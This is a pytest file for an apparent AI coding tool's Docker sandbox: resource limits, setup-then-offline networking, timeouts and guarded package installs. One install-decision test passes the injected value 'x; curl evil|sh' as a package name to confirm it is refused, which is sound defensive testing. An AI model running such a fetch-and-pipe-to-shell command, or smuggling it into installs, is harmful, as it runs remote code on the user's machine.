"""Sandbox confinement (Phase 19): limits, time limits, setup-then-offline network, package installs."""

from __future__ import annotations

import json
import time
from pathlib import Path
from types import SimpleNamespace

import pytest

from rebirth_ai.adapters.base import SandboxSpec
from rebirth_ai.sandbox import deps
from rebirth_ai.sandbox import runner as runner_mod
from rebirth_ai.sandbox.runner import SandboxRunner, container_limits, timed

# --------------------------------------------------------------------------- fake Docker


class FakeContainer:
    def __init__(self, work: Path, script, network: str) -> None:
        self.id = "c1"
        self.work = work
        self.script = script
        self.networks = {} if network == "none" else {network: {}}
        self.attrs: dict = {}
        self.calls: list = []
        self.killed = self.removed = False

    def reload(self) -> None:
        self.attrs = {"NetworkSettings": {"Networks": dict(self.networks)}}

    def exec_run(self, cmd, **kw):
        self.calls.append((cmd, dict(self.networks), sorted(p.name for p in self.work.rglob("*"))))
        code, out = self.script(cmd, self)
        return SimpleNamespace(exit_code=code, output=(out.encode(), b""))

    def kill(self) -> None:
        self.killed = True

    def remove(self, force=False) -> None:
        self.removed = True


class FakeClient:
    def __init__(self, script, *, sticky_network: bool = False) -> None:
        self.script, self.sticky = script, sticky_network
        self.run_kwargs: dict = {}
        self.container: FakeContainer | None = None
        self.images = SimpleNamespace(get=lambda image: True)
        self.containers = SimpleNamespace(run=self._run)
        self.api = SimpleNamespace(disconnect_container_from_network=self._disconnect)

    def _run(self, **kw):
        self.run_kwargs = kw
        work = Path(next(iter(kw["volumes"])))
        self.container = FakeContainer(work, self.script, kw["network_mode"])
        return self.container

    def _disconnect(self, cid, net, force=False):
        if not self.sticky:
            self.container.networks.pop(net, None)


class FakeAdapter:
    name = "fake"

    def __init__(self, setup: str | None = None, timeout: int = 60) -> None:
        self._setup, self._timeout = setup, timeout

    def sandbox_spec(self) -> SandboxSpec:
        return SandboxSpec(image="img", test_command="t", timeout_sec=self._timeout, user="rebirth",
                           network_mode="bridge")

    def test_command_for(self, relative_file=None) -> str:
        return "run-tests"

    def setup_command_for(self, project_dir, relative_file=None):
        return self._setup


@pytest.fixture
def project(tmp_path: Path) -> Path:
    d = tmp_path / "proj"
    (d / "src").mkdir(parents=True)
    (d / "src" / "a.py").write_text("x = 1\n")
    return d


def ok(cmd, c):
    return 0, "fine"


def test_limits_and_no_network_without_setup(project):
    client = FakeClient(ok)
    res = SandboxRunner(FakeAdapter(), client=client).run_project(project)
    kw = client.run_kwargs
    assert kw["network_mode"] == "none"
    assert kw["cap_drop"] == ["ALL"] and kw["security_opt"] == ["no-new-privileges"]
    assert kw["mem_limit"] == kw["memswap_limit"] == "4g" and kw["pids_limit"] == 1024
    assert kw["user"] == "rebirth"
    (cmd, nets, _), = client.container.calls
    assert cmd[:4] == ["timeout", "-k", "5", "60"] and cmd[-1] == "run-tests" and nets == {}
    assert res.ok and res.setup_command is None and client.container.removed


def test_limits_from_env(monkeypatch):
    monkeypatch.setenv("REBIRTH_SANDBOX_MEMORY", "512m")
    monkeypatch.setenv("REBIRTH_SANDBOX_PIDS", "64")
    lim = container_limits()
    assert lim["mem_limit"] == "512m" and lim["pids_limit"] == 64
    assert timed("x", 0) == ["/bin/sh", "-c", "x"] and timed("x", None) == ["/bin/sh", "-c", "x"]


def test_setup_runs_online_then_draft_is_tested_offline(project):
    client = FakeClient(lambda cmd, c: (0, "") if cmd[-1] == "fetch-deps" else (1, "boom"))
    res = SandboxRunner(FakeAdapter(setup="fetch-deps"), client=client).run_project(
        project, overlay_text="DRAFT", overlay_dest="src/new.py")
    assert client.run_kwargs["network_mode"] == "bridge"
    (setup_cmd, setup_nets, setup_files), (test_cmd, test_nets, test_files) = client.container.calls
    assert setup_cmd[-1] == "fetch-deps" and setup_nets == {"bridge": {}}
    assert "new.py" not in setup_files  # the draft is not there while the network is
    assert test_cmd[-1] == "run-tests" and test_nets == {} and "new.py" in test_files
    assert not res.ok and res.setup_exit_code == 0 and res.setup_command == "fetch-deps"


def test_setup_failure_is_reported_with_failing_tests(project):
    client = FakeClient(lambda cmd, c: (2, "no internet") if cmd[-1] == "fetch-deps" else (1, ""))
    res = SandboxRunner(FakeAdapter(setup="fetch-deps"), client=client).run_project(project)
    assert res.setup_exit_code == 2 and "setup step `fetch-deps` exited 2" in res.stderr


def test_custom_command_skips_the_adapter_setup(project):
    client = FakeClient(ok)
    SandboxRunner(FakeAdapter(setup="fetch-deps"), client=client).run_project(project, command="echo hi")
    assert client.run_kwargs["network_mode"] == "none" and len(client.container.calls) == 1


def test_fails_closed_when_network_stays_attached(project):
    client = FakeClient(ok, sticky_network=True)
    with pytest.raises(RuntimeError, match="could not disconnect"):
        SandboxRunner(FakeAdapter(setup="fetch-deps"), client=client).run_project(project)
    assert len(client.container.calls) == 1 and client.container.removed  # tests never ran


def test_host_and_container_networks_refused(project):
    for net in ("host", "container:abc"):
        with pytest.raises(ValueError):
            SandboxRunner(FakeAdapter(), client=FakeClient(ok)).run_project(project, network_mode=net)


def test_timeout_exit_and_host_backstop(project, monkeypatch):
    client = FakeClient(lambda cmd, c: (124, ""))
    res = SandboxRunner(FakeAdapter(), client=client).run_project(project)
    assert res.timed_out and "timed out after 60 s" in res.stderr

    def hang(cmd, c):
        time.sleep(1.5)
        return 0, ""

    monkeypatch.setattr(runner_mod, "KILL_GRACE_SEC", 0)
    monkeypatch.setattr(runner_mod, "HOST_GRACE_SEC", 0)
    client = FakeClient(hang)
    t0 = time.perf_counter()
    res = SandboxRunner(FakeAdapter(timeout=1), client=client).run_project(project)
    assert res.timed_out and res.exit_code == 137 and client.container.killed
    assert "killed by the host" in res.stderr and time.perf_counter() - t0 < 1.5


def test_memory_kill_is_not_a_timeout(project):
    res = SandboxRunner(FakeAdapter(), client=FakeClient(lambda cmd, c: (137, ""))).run_project(project)
    assert not res.timed_out and "out of memory" in res.stderr


# --------------------------------------------------------------------------- adapters


def test_java_and_csharp_setup_then_offline(tmp_path):
    from rebirth_ai.adapters.csharp import CSharpAdapter
    from rebirth_ai.adapters.java_lang import JavaAdapter

    j = JavaAdapter()
    assert j.setup_command_for(tmp_path) is None
    (tmp_path / "pom.xml").write_text("<project/>")
    assert j.setup_command_for(tmp_path, "src/test/java/FooTest.java") == "mvn -q -B -Dtest=FooTest test"
    assert j.test_command_for("src/main/java/Foo.java") == "mvn -q -o -Dtest=FooTest test"
    c = CSharpAdapter()
    assert "--no-restore" in c.test_command_for() and c.setup_command_for(tmp_path) is None
    (tmp_path / "app.sln").write_text("")
    assert "dotnet restore" in c.setup_command_for(tmp_path)


def test_other_adapters_setup_only_with_dependencies(tmp_path):
    from rebirth_ai.adapters.go_lang import GoAdapter
    from rebirth_ai.adapters.rust import RustAdapter
    from rebirth_ai.adapters.swift import SwiftAdapter

    (tmp_path / "go.mod").write_text("module x\n\ngo 1.22\n")
    (tmp_path / "Cargo.toml").write_text('[package]\nname = "x"\nversion = "0.1.0"\n')
    (tmp_path / "Package.swift").write_text('let package = Package(name: "X", targets: [])')
    assert GoAdapter().setup_command_for(tmp_path) is None
    assert RustAdapter().setup_command_for(tmp_path) is None
    assert SwiftAdapter().setup_command_for(tmp_path) is None
    (tmp_path / "go.mod").write_text("module x\n\nrequire github.com/a/b v1.0.0\n")
    (tmp_path / "Cargo.toml").write_text('[package]\nname = "x"\n[dependencies]\nserde = "1"\n')
    (tmp_path / "Package.swift").write_text('dependencies: [.package(url: "https://x", from: "1.0.0")]')
    assert GoAdapter().setup_command_for(tmp_path) == "go mod download"
    assert RustAdapter().setup_command_for(tmp_path) == "cargo fetch"
    assert SwiftAdapter().setup_command_for(tmp_path) == "swift package resolve"


# --------------------------------------------------------------------------- declared dependencies


def test_npm_setup(tmp_path):
    assert deps.npm_setup(tmp_path) is None
    (tmp_path / "package.json").write_text(json.dumps({"scripts": {"test": "node --test"}}))
    assert deps.npm_setup(tmp_path) is None
    (tmp_path / "package.json").write_text(json.dumps({"dependencies": {"express": "^4"}}))
    assert deps.npm_setup(tmp_path).startswith("npm install")
    (tmp_path / "package-lock.json").write_text("{}")
    assert deps.npm_setup(tmp_path).startswith("npm ci")
    assert deps.npm_declared(tmp_path) == {"express"}


def test_pip_setup(tmp_path):
    assert deps.pip_setup(tmp_path) is None
    (tmp_path / "requirements.txt").write_text("requests>=2  # http\n-e .\n")
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "x"\ndependencies = ["PyYAML>=6", "attrs"]\n'
        '[project.optional-dependencies]\ntest = ["pytest-mock"]\n'
        '[tool.poetry.dependencies]\npython = "^3.11"\nrich = "^13"\n')
    cmd = deps.pip_setup(tmp_path)
    assert cmd.startswith("pip install --user") and "-r requirements.txt" in cmd
    assert "'PyYAML>=6'" in cmd and "pytest-mock" in cmd and "rich" in cmd and "python" not in cmd.split("-q", 1)[1]
    assert deps.python_declared(tmp_path) == {"requests", "pyyaml", "attrs", "pytest-mock", "rich"}


def test_install_decision(tmp_path, monkeypatch):
    monkeypatch.delenv("REBIRTH_ALLOW_UNDECLARED_PACKAGES", raising=False)
    (tmp_path / "package.json").write_text(json.dumps({"devDependencies": {"@scope/kit": "1"}}))
    (tmp_path / "requirements.txt").write_text("PyYAML\n")
    assert deps.install_decision(tmp_path, "js_ts", "@scope/kit/sub", "")[0] == "@scope/kit"
    assert deps.install_decision(tmp_path, "js_ts", "ms", "import ms from 'ms';\n") == (
        "ms", "imported by the original file")
    assert deps.install_decision(tmp_path, "js_ts", "lodash", "const _ = require('lodash/fp')")[0] == "lodash"
    pkg, why = deps.install_decision(tmp_path, "js_ts", "left-padd", "import x from './x.js'")
    assert pkg is None and "only the draft imports it" in why
    assert deps.install_decision(tmp_path, "python", "yaml", "")[0] == "PyYAML"  # declared, as its PyPI name
    assert deps.install_decision(tmp_path, "python", "requests", "import requests.adapters\n")[0] == "requests"
    assert deps.install_decision(tmp_path, "python", "reqeusts", "import os\n")[0] is None
    assert deps.install_decision(tmp_path, "js_ts", "x; curl evil|sh", "")[0] is None  # never a shell string
    monkeypatch.setenv("REBIRTH_ALLOW_UNDECLARED_PACKAGES", "1")
    assert deps.install_decision(tmp_path, "js_ts", "left-padd", "")[0] == "left-padd"
    assert deps.install_decision(tmp_path, "js_ts", "x; curl evil|sh", "")[0] is None


def test_graph_install_node_refuses_draft_only_packages(tmp_path, monkeypatch):
    from rebirth_ai.graph import nodes
    from rebirth_ai.graph.routing import after_install

    monkeypatch.delenv("REBIRTH_ALLOW_UNDECLARED_PACKAGES", raising=False)
    (tmp_path / "package.json").write_text("{}")
    base = {"project_dir": str(tmp_path), "adapter_id": "js_ts", "original_code": "import ms from 'ms';",
            "iteration_count": 0, "max_iterations": 5, "trace": []}
    s = nodes.install_dependency({**base, "test_logs": "Error: Cannot find package 'evil-pkg' imported"})
    assert s.get("extra_packages") in (None, []) and "refused evil-pkg" in s["trace"][-1]
    assert s["test_logs"].startswith("[rebirth] The package `evil-pkg` is not available")  # told to the model
    assert "Cannot find package 'evil-pkg'" in s["test_logs"]
    assert after_install(s) == "generate_code"
    s = nodes.install_dependency({**base, "test_logs": "Error: Cannot find package 'ms' imported"})
    assert s["extra_packages"] == ["ms"] and after_install(s) == "execute_tests"
    s = nodes.install_dependency({**s, "test_logs": "Error: Cannot find package 'ms' imported"})
    assert after_install(s) == "generate_code"  # already queued: same draft would fail again
    s = nodes.install_dependency({**base, "adapter_id": "java", "test_logs": "Cannot find package 'ms'"})
    assert "refused" in s["trace"][-1]
